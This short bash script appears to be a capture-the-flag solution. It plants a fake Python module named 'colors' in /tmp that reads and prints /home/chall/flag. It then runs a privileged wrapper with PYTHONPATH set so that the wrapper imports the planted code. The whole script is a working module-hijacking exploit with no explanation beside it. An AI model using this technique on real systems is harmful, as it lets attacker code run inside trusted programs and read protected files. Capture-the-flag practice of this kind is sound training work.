#!/bin/bash

mkdir -p /tmp/bla/colors
touch /tmp/bla/colors/__init__.py
cat <<EOF>/tmp/bla/colors/colors.py
with open('/home/chall/flag') as f:
    print(f.read())
EOF
PYTHONPATH=/tmp/bla /home/chall/wrapper
